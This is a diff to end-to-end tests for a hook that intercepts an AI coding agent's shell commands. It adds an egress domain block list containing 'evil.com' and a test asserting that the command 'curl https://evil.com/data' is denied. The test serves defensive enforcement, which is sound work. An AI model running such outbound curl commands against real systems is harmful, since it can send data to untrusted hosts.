@@ -88,6 +88,7 @@ describe("Cursor Handler Script (E2E)", () => {
       projectDir: tmpDir,
       enforcement_mode: "enforce",
       toolBlocklist: ["NotebookEdit"],
+      egressBlockedDomains: ["evil.com"],
       log_level: "silent",
     });
     await interceptor.start();
@@ -115,6 +116,7 @@ describe("Cursor Handler Script (E2E)", () => {
     const interceptor = new CursorInterceptor({
       projectDir: project,
       enforcement_mode: "monitor",
+      egressBlockedDomains: ["evil.com"],
       log_level: "silent",
     });
     await interceptor.start();
@@ -235,6 +237,23 @@ describe("Cursor Handler Script (E2E)", () => {
     expect(result.exitCode).toBe(0);
     expect(result.parsed.permission).toBe("deny");
     expect(result.parsed.userMessage).toContain("curl");
+  });
+
+  it("blocks network egress to blocked domains", async () => {
+    const input = JSON.stringify({
+      hook_event_name: "beforeShellExecution",
+      conversation_id: "test-conv-egress-001",
+      generation_id: "test-gen-egress-001",
+      command: "curl https://evil.com/data",
+      cwd: tmpDir,
+      workspace_roots: [tmpDir],
+    });
+
+    const result = await runHandler(handlerPath, input);
+    expect(result.exitCode).toBe(0);
+    expect(result.parsed.permission).toBe("deny");
+    expect(result.parsed.userMessage).toContain("Network egress");
+    expect(result.parsed.userMessage).toContain("evil.com");
   });
 
   it("blocks /bin/rm and command rm evasions", async () => {
